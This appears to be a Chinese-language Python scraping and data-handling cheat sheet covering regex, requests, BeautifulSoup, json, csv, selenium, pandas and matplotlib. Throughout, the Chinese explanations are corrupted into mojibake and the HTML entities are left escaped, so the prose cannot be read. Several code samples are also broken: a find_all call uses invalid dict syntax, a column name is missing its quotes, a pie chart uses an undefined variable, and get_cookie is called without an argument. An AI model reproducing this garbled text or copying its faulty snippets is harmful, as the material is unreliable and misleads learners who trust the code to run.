colou?rï¼šcolorã€colourçš†ç‚ºç¬¦åˆ + å‰ä¸€å€‹å­—å…ƒè¦ä¸€æ¬¡ä»¥ä¸Šæ‰ç¬¦åˆ er+ï¼šerä¸ç¬¦åˆ,errã€errr\u0026hellip;ç­‰æ‰ç¬¦åˆ $ 1.ä½æ•¸ç”±å¾Œå¾€å‰åŒ¹é… 2.ç‚ºçµå°¾æ‰åŒ¹é… [1-9]\\d$ï¼š1 ~ 99çš†ç‚ºç¬¦åˆ,100ä¸ç¬¦åˆ () 1.åƒ…æ”¶é›†æ‹¬è™Ÿå…§çš„å…§å®¹ 2.åˆ†çµ„åˆ¥ä»¥ä¾¿.group(çµ„åˆ¥)å¯ä»¥ç›´æ¥æŠ“åˆ°å€¼ r'\u0026lt;h3 class=\u0026quot;LC20lb DKV0Md\u0026quot;\u0026gt;(.*?)\u0026lt;/h3\u0026gt;'ï¼šåƒ…å›å‚³\u0026lt;h3\u0026gt;å…§çš„æ–‡å­— \\b é‚Šç•Œ,ç‚ºé‚Šç•Œå‰‡ç¬¦åˆ dog\\bï¼š\u0026lsquo;dog \u0026lsquo;ç¬¦åˆ,\u0026lsquo;dog\u0026rsquo;ä¸ç¬¦åˆ \\æ•¸å­— åˆ†çµ„å‘å‰åƒè€ƒ è²ªå©ª/é€æ­¥é‡è© (*/?) è²ªå©ªé‡è© - *:0æ¬¡~ç„¡é™æ¬¡çš†ç¬¦åˆã€‚ 1 2 3 re.match(r\u0026#34;\u0026lt;.*\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt; é€æ­¥é‡è© - ?:å›å‚³æœ€çŸ­çš„é‡è©ã€‚ 1 2 3 re.match(r\u0026#34;\u0026lt;.*?\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt; è¼‰å…¥æ¨¡çµ„ 1 import re åˆ†å‰²å­—ä¸² - re.split(æ­£å‰‡, åˆ†å‰²çš„å­—ä¸²) 1 2 3 print(re.split(\u0026#39;\\d\u0026#39;, \u0026#34;Andy1Ben2Cathy\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;Andy\u0026#39;, \u0026#39;Ben\u0026#39;, \u0026#39;Cathy\u0026#39;] å–ä»£å­—å…ƒ - re.sub(æ­£å‰‡, æ¬²å–ä»£çš„å­—å…ƒ, å­—ä¸²) 1 2 3 re.sub(\u0026#34;\\d\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;Andy1Ben2Cathy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Andy-Ben-Cathy\u0026#39; åŒ¹é…å­—å…ƒ - re.match(æ¬²åŒ¹é…çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.match(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; å°‹æ‰¾å­—å…ƒ(æ‰¾ç¬¬ä¸€å€‹) - re.search(æ¬²å°‹æ‰¾çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.search(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; å°‹æ‰¾å­—å…ƒ(æ‰¾æ‰€æœ‰) - re.findall(æ¬²å°‹æ‰¾çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.findall(\u0026#39;\\d{4}-\\d{6}\u0026#39;, \u0026#34;jjladpoiwlkj 0800-123456 hjkpojas 0921-456873\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;0800-123456\u0026#39;, \u0026#39;0921-456873\u0026#39;] æŠ“htmlæ¨¡çµ„ - requests è¼‰å…¥æ¨¡çµ„ 1 import requests GET æŠ“å–æª”æ¡ˆ - .get(ç¶²å€) 1 response = requests.get(\u0026#34;https://www.baidu.com/\u0026#34;) GET å¯å¸¶çš„åƒæ•¸(éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸) èªªæ˜ headers è«‹æ±‚çš„headers params åƒæ•¸ cookies clientçš„cookies æŠ“å–æ¨™é ­(head) - .head(ç¶²å€) 1 2 # .head() -\u0026gt; åªæŠ“æ¨™é ­ reshead = requests.head(\u0026#34;https://www.baidu.com/\u0026#34;) ç‹€æ…‹ç¢¼ - status_code 1 2 3 print(response.status_code) \u0026gt;\u0026gt;\u0026gt; 200 # 200ç‚ºæ­£å¸¸é€£ç·š ç·¨ç¢¼æ ¼å¼ - encoding 1 2 3 4 5 print(response.encoding) \u0026gt;\u0026gt;\u0026gt; \u0026#39;ISO-8859-1\u0026#39; # è½‰ç·¨ç¢¼ç‚ºutf-8 response.encoding = \u0026#34;utf-8\u0026#34; htmlå…§å®¹ - text 1 2 3 print(response.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\\r\\n\u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt;...\u0026#39; response headers - headers 1 2 3 print(response.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;Server\u0026#39;: \u0026#39;Baby Web Server\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;467\u0026#39;, \u0026#39;Set-Cookie\u0026#39;: \u0026#39;SESSIONID=00000006; path=/;version=1\u0026#39;, \u0026#39;Date\u0026#39;: \u0026#39;Sun, 03 May 2020 10:41:58 GMT\u0026#39;} request headers - request.headers å…¶ä¸­çš„User-Agentç›¸ç•¶é‡è¦ï¼Œç”¨ä¾†åˆ¤æ–·ä½¿ç”¨è€…çš„ç›¸é—œè³‡è¨Šç”¨ï¼Œçˆ¬èŸ²èˆ‡åçˆ¬èŸ²é€šå¸¸ä½¿ç”¨æ­¤åƒæ•¸ã€‚ 1 2 3 print(response.request.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.22.0\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;} æŠ“åœ–ç‰‡æª” é–‹æª”æ ¼å¼ä½¿ç”¨wb:äºŒé€²ä½æ ¼å¼å¯«å…¥ w:å¯«å…¥ / b:äºŒé€²ä½æ ¼å¼ 1 2 3 4 5 6 7 8 import requests res = requests.get(\u0026#34;https://www.natgeomedia.com/userfiles/PhotoContest/771/sm1100/2019091450912553.jpg\u0026#34;) photo = res.content # w:å¯«å…¥/b:äºŒé€²ä½æ ¼å¼ \u0026#34;wb\u0026#34; =\u0026gt; äºŒé€²ä½æ ¼å¼å¯«å…¥ with open(\u0026#34;img01.jpg\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(photo) å¸¶request headerçš„è«‹æ±‚ å…ˆå¾ä¸€èˆ¬ç€è¦½å™¨å–å¾—header(user-agent) éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸ 1 2 3 4 5 # å¾ç€è¦½å™¨çš„é–‹ç™¼è€…å·¥å…·å–å¾—æ­£å¸¸çš„request headersè³‡æ–™ headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} # åœ¨å¾Œæ–¹å¸¶å…¥é—œéµå­—åƒæ•¸headers res = requests.get(\u0026#34;http://google.com.tw\u0026#34;, headers = headers) POST POST å¯å¸¶çš„åƒæ•¸(éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸) èªªæ˜ data form dataè«‹æ±‚çš„data headers è«‹æ±‚çš„headers cookies clientçš„cookies POSTå­˜Session - .Session() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 data = { \u0026#34;from\u0026#34;: \u0026#34;/bbs/Gossiping/index.html\u0026#34;, \u0026#34;yes\u0026#34;: \u0026#34;yes\u0026#34; } headers = { \u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; } # å…ˆä½¿ç”¨POSTå–å¾—æ»¿18æ­²çš„é©—è­‰ä¸¦å­˜æ”¾ç½®sessionå…§ rs = requests.Session() rs.post(\u0026#34;https://www.ptt.cc/ask/over18\u0026#34;, data = data, headers = headers) # éæ»¿18æ­²çš„é©—è­‰å¾Œä½¿ç”¨getå–å¾—ç¶²é å…§å®¹ response = rs.get(\u0026#34;https://www.ptt.cc/bbs/Gossiping/index.html\u0026#34;, headers = headers) è§£æ\u0026amp;ç¾åŒ–HTMLæ¨¡çµ„ - BeautifulSoup4 è¼‰å…¥æ¨¡çµ„ 1 from bs4 import BeautifulSoup BeautifulSoup4çš„åŸºæœ¬å…ƒç´ è¡¨ åŸºæœ¬å…ƒç´  èªªæ˜ tag æ¨™ç±¤ï¼šæœ€åŸºæœ¬çš„ä¿¡æ¯çµ„ç¹”å–®ä½ï¼Œåˆ†åˆ¥ç”¨\u0026lt;\u0026gt;å’Œ\u0026lt;/\u0026gt;æ¨™æ˜é–‹é ­èˆ‡çµå°¾ã€‚ name æ¨™ç±¤åç¨±ï¼š\u0026lt;p\u0026gt;...\u0026lt;/p\u0026gt;çš„åå­—æ˜¯pï¼Œæ ¼å¼ï¼š\u0026lt;tag\u0026gt;.nameã€‚ Attributes å±¬æ€§ï¼š\u0026lt;tag\u0026gt;.attrsï¼Œdictå‹å¼ã€‚ NavigatString å…§å®¹ï¼š\u0026lt;tag\u0026gt;.stringã€‚ Comment è¨»é‡‹ï¼šæ¨™ç±¤å…§å­—ç¬¦ä¸²çš„è¨»é‡‹éƒ¨åˆ†ï¼Œä¸€ç¨®ç‰¹æ®Šçš„Commenté¡å‹ã€‚ è§£æ - .BeautifulSoup(html, \u0026lsquo;html.parser\u0026rsquo;) 1 2 3 4 5 6 7 8 9 10 demo = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;This is a python demo page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;course\u0026#34;\u0026gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; class=\u0026#34;py1\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-1001870001\u0026#34; class=\u0026#34;py2\u0026#34; id=\u0026#34;link2\u0026#34;\u0026gt;Advanced Python\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; soup = BeautifulSoup(demo, \u0026#39;html.parser\u0026#39;) ç¾åŒ– - .prettify() 1 print(soup.prettify()) å–å¾—å±¬æ€§ - .attrs 1 2 3 4 5 print(soup.a.attrs) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;href\u0026#39;: \u0026#39;http://www.icourse163.org/course/BIT-268001\u0026#39;, \u0026#39;class\u0026#39;: [\u0026#39;py1\u0026#39;], \u0026#39;id\u0026#39;: \u0026#39;link1\u0026#39;} å–å¾—tagå…§å®¹ - .string/.text 1 2 3 4 5 print(soup.a.string) print(soup.a.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; æ‰¾ç¬¬ä¸€å€‹æ¨™ç±¤ - .find(\u0026quot;æ¨™ç±¤\u0026quot;) 1 2 3 soup.find(\u0026#34;a\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; æ‰¾å…¨éƒ¨çš„æ¨™ç±¤ - .find_all(\u0026quot;æ¨™ç±¤\u0026quot;, class_=\u0026quot;className\u0026quot;) å¯åŠ ä¸Šclassåšç¯©é¸æ¢ä»¶ã€‚ 1 2 3 4 5 6 7 8 9 # å¯«æ³•1ï¼š soup.find_all(\u0026#34;p\u0026#34;, class_=\u0026#34;title\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # å¯«æ³•2ï¼š soup.find_all(\u0026#34;p\u0026#34;, {\u0026#34;class\u0026#34;=\u0026#34;title\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] é€éé¸æ“‡å™¨ç¯©é¸æ¨™ç±¤ - .select(åŒCSSé¸æ“‡å™¨,Classæˆ–ID) è‹¥æœ‰ç©ºæ ¼æœƒæœ‰å•é¡Œï¼Œsoup.select(.\u0026quot;title p\u0026quot;) æœƒå ±éŒ¯ï¼Œç©ºæ ¼éœ€ä½¿ç”¨.find()ã€.findAll() 1 2 3 4 5 6 7 # ä½¿ç”¨Classé¸æ“‡å™¨ print(soup.select(\u0026#34;.title\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # ä½¿ç”¨IDé¸æ“‡å™¨ print(soup.select(\u0026#34;#link1\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt;] jsonæ¨¡çµ„ è¼‰å…¥æ¨¡çµ„ 1 import json jsonè½‰dict - json.loads(\u0026quot;å­—ä¸²\u0026quot;) 1 2 3 4 5 6 7 import json txt = \u0026#39;{ \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; }\u0026#39; data = json.loads(txt) print(type(data)) # å­—å…¸å‹æ…‹ \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;\u0026#39; dictè½‰json string - json.dumps(\u0026quot;å­—å…¸\u0026quot;) 1 2 3 4 5 6 7 import json txt = { \u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34; } jsonData = json.dumps(txt) print(jsonData) # è½‰æ›å¾Œç‚ºjsonæ ¼å¼çš„å­—ä¸² \u0026gt;\u0026gt;\u0026gt; {\u0026#34;name\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;28\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Taiwan\u0026#34;} csvæ¨¡çµ„ è¼‰å…¥æ¨¡çµ„ 1 import csv ä»¥_csv.readerå‹æ…‹è®€å–csvæª” - csv.reader(æª”æ¡ˆ) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.reader(file) # ä¸€ç­†ä¸€ç­†å–å‡ºè³‡æ–™ for row in rows: print(row) ä»¥dictå‹æ…‹è®€å–csvæª” - csv.DictReader(æª”æ¡ˆ) 1 2 3 4 5 6 import csv with open(\u0026#39;MI_5MINS_HIST.csv\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as file: rows = csv.DictReader(file) # ä¸€ç­†ä¸€ç­†å–å‡ºè³‡æ–™ for row in rows: print(row) å¯«å…¥csvæª” - csv.writer(æª”æ¡ˆè®Šæ•¸) éœ€å…ˆå®šç¾©ä¸€å€‹ç‰©ä»¶ç‚ºcsv.writer()ï¼Œåœ¨é€²è¡Œå¯«å…¥ã€‚ writerow() ï¼šå–®è¡Œå¯«å…¥ 1 2 3 4 5 6 with open(\u0026#39;Temp.csv\u0026#39;, \u0026#39;w\u0026#39;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#39;å§“å\u0026#39;, \u0026#39;èº«é«˜\u0026#39;, \u0026#39;é«”é‡\u0026#39;]) writer.writerow([\u0026#39;Jessica\u0026#39;, 158, 45]) writer.writerow([\u0026#39;Wayne\u0026#39;, 172, 60]) ä»¥å­—å…¸å‹æ…‹å¯«å…¥csvæª” - csv.DictWriter(æª”æ¡ˆè®Šæ•¸, fieldnames=æ¬„ä½è®Šæ•¸(åˆ—è¡¨å‹æ…‹)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;DictTemp.csv\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;big5\u0026#39;) as csvfile: # è¨­å®šæ¬„ä½è®Šæ•¸ rowNames = [\u0026#39;å§“å\u0026#39;, \u0026#39;èº«é«˜\u0026#39;, \u0026#39;é«”é‡\u0026#39;] # fieldnames = æŒ‡å®šæ¬„ä½ writer = csv.DictWriter(csvfile, fieldnames=rowNames) # å¯«å…¥æ¬„ä½åç¨± writer.writeheader() #å¯«å…¥è³‡æ–™ writer.writerow({\u0026#39;å§“å\u0026#39;: \u0026#39;Jessica\u0026#39;, \u0026#39;èº«é«˜\u0026#39;: 156, \u0026#39;é«”é‡\u0026#39;: 45}) writer.writerow({\u0026#39;å§“å\u0026#39;: \u0026#39;Wayne\u0026#39;, \u0026#39;èº«é«˜\u0026#39;: 172, \u0026#39;é«”é‡\u0026#39;: 60}) æ¨¡æ“¬ç€è¦½å™¨æ¨¡çµ„(è‡ªå‹•åŒ–æ¸¬è©¦) - selenium å®‰è£ selenium æ¨¡çµ„ Anacondaç·¨è­¯å™¨çš„è©±ï¼Œä½¿ç”¨Anaconda Prompt 1 2 ### anaconda å®‰è£ selenium æ¨¡çµ„ conda install selenium 1 2 ### ä½¿ç”¨ pip å®‰è£ selenium æ¨¡çµ„ pip install selenium ä¸‹è¼‰ç€è¦½å™¨é©…å‹•(web driver)\nå…ˆæŸ¥çœ‹chromeç€è¦½å™¨çš„ç‰ˆæœ¬ï¼ŒGoogleï¼šWeb driver chromeå¾Œä¸‹è¼‰ã€‚\nè¼‰å…¥æ¨¡çµ„\n1 from selenium import webdriver å¯¦ä¾‹åŒ–ä¸€å€‹ç€è¦½å™¨è¦–çª—(Chrome)ï¼Œä¸¦è¨­å®šä¸€å€‹ç€è¦½å™¨ç‰©ä»¶ æª”æ¡ˆåç¨±å‹¿èˆ‡seleniumæ¨¡çµ„åç¨±ç›¸åŒä»¥å…è¡çªè€Œç„¡æ³•åŸ·è¡Œ 1 2 3 from selenium import webdriver driver = webdriver.Chrome() ç™¼é€GETè«‹æ±‚ - ç€è¦½å™¨ç‰©ä»¶.get(ç¶²å€) 1 driver.get(\u0026#34;http://www.baidu.com\u0026#34;) æ ¹æ“šdomå…ƒä»¶çš„id/classå®šä½ - ç€è¦½å™¨ç‰©ä»¶.find_element_by_id(id) æˆ– ç€è¦½å™¨ç‰©ä»¶.find_element_by_class(class) 1 2 # æ‰¾åˆ°idç‚º\u0026#34;kw\u0026#34;çš„inputï¼Œä¸¦è¼¸å…¥\u0026#34;python\u0026#34; driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;python\u0026#34;) é€å‡ºè¡¨å–® - ç€è¦½å™¨ç‰©ä»¶.domå…ƒä»¶.submit() 1 2 # é€å‡ºidç‚º\u0026#34;su\u0026#34;çš„è¡¨å–® driver.find_element_by_id(\u0026#34;su\u0026#34;).submit() é»æ“Šäº‹ä»¶ - ç€è¦½å™¨ç‰©ä»¶.domå…ƒä»¶.click() 1 2 # é€å‡ºidç‚º\u0026#34;btn\u0026#34;çš„æŒ‰éˆ• driver.find_element_by_id(\u0026#34;btn\u0026#34;).click() å–å¾—é é¢åŸå§‹ç¢¼ - .page_source 1 SourceHtml = driver.page_source è¢å¹•æˆªåœ– - ç€è¦½å™¨ç‰©ä»¶.save_screenshot(æˆªåœ–çš„åœ–æª”åç¨±) 1 driver.save_screenshot(\u0026#34;screen.png\u0026#34;) ç²å–cookies - ç€è¦½å™¨ç‰©ä»¶.get_cookie() 1 2 cookies = driver.get_cookie() print(cookies) é—œé–‰å¯¦ä¾‹åŒ–çš„ç€è¦½å™¨è¦–çª— - ç€è¦½å™¨ç‰©ä»¶.close() æˆ– ç€è¦½å™¨ç‰©ä»¶.quit() 1 2 driver.close() # æˆ– driver.quit() è³‡æ–™åˆ†ææ¨¡çµ„ - Pandas è¼‰å…¥æ¨¡çµ„ 1 import pandas è§£ælisté¡å‹ - pandasç‰©ä»¶.Series(è³‡æ–™) 1 2 3 4 5 6 7 8 9 import pandas data = [20, 10, 15] pds = pandas.Series(data) print(pds) \u0026gt;\u0026gt;\u0026gt; 0 20 \u0026gt;\u0026gt;\u0026gt; 1 10 \u0026gt;\u0026gt;\u0026gt; 2 15 \u0026gt;\u0026gt;\u0026gt; dtype: int64 è§£æDataé¡å‹ - pandasç‰©ä»¶.DataFrame(å­—å…¸å‹æ…‹çš„è³‡æ–™) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 # å–ç‰¹å®šæ¬„ä½ print(data[salary]) \u0026gt;\u0026gt;\u0026gt; 0 1000 \u0026gt;\u0026gt;\u0026gt; 1 5000 \u0026gt;\u0026gt;\u0026gt; 2 2000 å¯æŒ‡å®šxè»¸æˆ–yè»¸æ¬„ä½åç¨±(columns, index) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100], ] index = [\u0026#34;å¼µä¸‰\u0026#34;, \u0026#34;æå››\u0026#34;, \u0026#34;ç‹äº”\u0026#34;, \u0026#34;è¶™é›²\u0026#34;] columns = [\u0026#34;åœ‹æ–‡\u0026#34;, \u0026#34;æ•¸å­¸\u0026#34;, \u0026#34;è‹±æ–‡\u0026#34;, \u0026#34;è‡ªç„¶\u0026#34;, \u0026#34;ç¤¾æœƒ\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) print(df) \u0026gt;\u0026gt;\u0026gt; åœ‹æ–‡ æ•¸å­¸ è‹±æ–‡ è‡ªç„¶ ç¤¾æœƒ \u0026gt;\u0026gt;\u0026gt; å¼µä¸‰ 65 92 78 83 70 \u0026gt;\u0026gt;\u0026gt; æå›› 62 96 81 63 71 \u0026gt;\u0026gt;\u0026gt; ç‹äº” 45 58 30 53 75 \u0026gt;\u0026gt;\u0026gt; è¶™é›² 90 91 70 90 100 å›å‚³æœ€å¤§å€¼ - Dataè³‡æ–™.max() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.max()) \u0026gt;\u0026gt;\u0026gt; 20 å›å‚³æœ€å°å€¼ - è³‡æ–™.min() 1 2 3 4 5 data = [20, 10, 15] pds = pandas.Series(data) print(pds.min()) \u0026gt;\u0026gt;\u0026gt; 10 å–å¾—æŒ‡å®šæ¬„ä½ - Dataè³‡æ–™.loc[x][y] 1 2 3 4 5 6 7 8 9 10 11 12 13 data = pandas.DataFrame({ \u0026#34;name\u0026#34;: [\u0026#34;Amy\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;Cathy\u0026#34;], \u0026#34;salary\u0026#34;: [1000, 5000, 2000] }) print(data) print(data.loc[0][1]) \u0026gt;\u0026gt;\u0026gt; name salary \u0026gt;\u0026gt;\u0026gt; 0 Amy 1000 \u0026gt;\u0026gt;\u0026gt; 1 Jack 5000 \u0026gt;\u0026gt;\u0026gt; 2 Cathy 2000 \u0026gt;\u0026gt;\u0026gt; 1000 è¼¸å‡ºæˆcsv(æˆ–json)æª”æ¡ˆ - Dataè³‡æ–™.to_csv(\u0026quot;æª”å\u0026quot;, encoding=\u0026quot;ç·¨ç¢¼\u0026quot;) æˆ– Dataè³‡æ–™.to_json(\u0026quot;æª”å\u0026quot;, encoding=\u0026quot;ç·¨ç¢¼\u0026quot;) 1 2 3 4 5 6 7 8 9 10 11 import pandas data = [ [65,92,78,83,70], [62,96,81,63,71], [45,58,30,53,75], [90,91,70,90,100] ] index = [\u0026#34;å¼µä¸‰\u0026#34;, \u0026#34;æå››\u0026#34;, \u0026#34;ç‹äº”\u0026#34;, \u0026#34;è¶™é›²\u0026#34;] columns = [\u0026#34;åœ‹æ–‡\u0026#34;, \u0026#34;æ•¸å­¸\u0026#34;, \u0026#34;è‹±æ–‡\u0026#34;, \u0026#34;è‡ªç„¶\u0026#34;, \u0026#34;ç¤¾æœƒ\u0026#34;] df = pandas.DataFrame(data, columns = columns, index = index) df.to_csv(\u0026#39;temp.csv\u0026#39;, encoding=\u0026#34;utf-8-sig\u0026#34;) ç¹ªåœ–æ¨¡çµ„ - plot è¼‰å…¥æ¨¡çµ„ 1 import matplotlib.pyplot as plt ç•«æŠ˜ç·šåœ– - .plot(Xè»¸è³‡æ–™, Yè»¸è³‡æ–™) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # ç•«å‡ºæŠ˜ç·šåœ– plt.plot(x1, y1) é¡¯ç¤ºLabel - .legend() è¦é¡¯ç¤ºlabeléœ€åŸ·è¡Œæ­¤function :ç‚ºé»ç·š, --ç‚ºè™›ç·š, ä¸æŒ‡å®šé è¨­ç‚ºå¯¦ç·š 1 2 3 4 5 6 7 8 9 10 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # :ç‚ºé»ç·š, --ç‚ºè™›ç·š, ä¸æŒ‡å®šé è¨­ç‚ºå¯¦ç·š plt.plot(x1, y1, label=\u0026#34;food\u0026#34;, color=\u0026#34;red\u0026#34;, linestyle=\u0026#34;:\u0026#34;) #è¦é¡¯ç¤ºlabel - éœ€åŸ·è¡Œlegend() plt.legend() æŒ‡å®šåœ–è¡¨æ¨™é¡Œ - .title() 1 plt.title(\u0026#34;å­¸ç”Ÿæˆç¸¾\u0026#34;) æŒ‡å®šX/Yè»¸æ¨™é¡Œ - .xlabel(Xè»¸æ¨™é¡Œ) / .ylabel(Yè»¸æ¨™é¡Œ) 1 2 plt.xlabel(\u0026#34;Xè»¸æ¨™é¡Œ\u0026#34;) plt.ylabel(\u0026#34;Yè»¸æ¨™é¡Œ\u0026#34;) ç•«é•·æ¢åœ– - .bar(Xè»¸è³‡æ–™, Yè»¸è³‡æ–™) 1 2 3 4 5 6 7 import matplotlib.pyplot as plt x1 = [1,4,7,9,13,16] y1 = [15,50,80,40,70,50] # ç•«å‡ºé•·æ¢åœ– plt.bar(x1, y1) ç•«åœ“é¤…åœ– - .pie(è³‡æ–™) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import matplotlib.pyplot as plt datas = [5,10,20,15] # ç•«å‡ºåœ“é¤…åœ– plt.pie(datas) # è®“ç‰¹å®šå€å¡Šå‡¸å‡º(éœ€èˆ‡è³‡æ–™æ•¸é‡ç›¸åŒ) explode = [0,0,0.05,0] plt.pie(datas, explode = explode) # æŒ‡å®šæ¯å€‹å€å¡Šçš„æ¨™é¡Œ labels = [\u0026#34;æ±éƒ¨\u0026#34;,\u0026#34;å—éƒ¨\u0026#34;,\u0026#34;è¥¿éƒ¨\u0026#34;,\u0026#34;åŒ—éƒ¨\u0026#34;] plt.pie(sizes, labels = labels) # é¡¯ç¤ºç™¾åˆ†æ¯” plt.pie(sizes,autopct=\u0026#34;%3.1f%%\u0026#34;) ç¹ªåœ–æ¨¡çµ„2 - plotly å®‰è£ plotly æ¨¡çµ„ Anacondaç·¨è­¯å™¨çš„è©±ï¼Œéœ€ä½¿ç”¨Anaconda Promptå®‰è£ã€‚ ä½¿ç”¨Jupyter Notebookç·¨è¼¯ 1 2 ### anaconda å®‰è£ plotly æ¨¡çµ„ conda install plotly 